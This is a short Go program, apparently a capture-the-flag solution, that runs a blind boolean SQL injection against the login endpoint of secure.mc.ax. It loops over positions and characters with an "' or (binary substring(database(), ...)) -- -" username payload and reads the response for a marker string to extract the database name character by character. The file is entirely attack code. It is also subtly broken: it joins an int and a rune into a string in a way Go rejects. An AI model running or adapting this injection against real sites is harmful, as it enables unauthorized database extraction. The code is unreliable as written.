package main
import (
	"fmt"
	"net/http"
    "net/url"
    // "strconv"
    "strings"
	"io/ioutil"
)

func main() {
	const alphanumeric = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@!{}$%^&*()_-"
	const trueResp = "Hmmm"
	var i int
	for i = 1; i <= 100; i++ {
		for _, char := range alphanumeric {
			apiUrl := "https://secure.mc.ax"
			resource := "/login/"
			data := url.Values{}

			payload := "' or (binary substring(database(), "+i+", 1) = '"+char+"') -- -"

			data.Set("username", payload)
			data.Set("password", "bar")
		
			u, _ := url.ParseRequestURI(apiUrl)
			u.Path = resource
			urlStr := u.String()
		
			client := &http.Client{}
			r, err := http.NewRequest(http.MethodPost, urlStr, strings.NewReader(data.Encode()))
			r.Header.Add("Content-Type", "application/x-www-form-urlencoded")
			if err != nil {
				panic(err)
			}
			resp, _ := client.Do(r)
			defer resp.Body.Close()
		
			body, _ := ioutil.ReadAll(resp.Body)

			if strings.Contains(string(body), trueResp) {
				fmt.Printf("Hasil: %d %c\n", i, char)
				break
			}
		}
	}
}
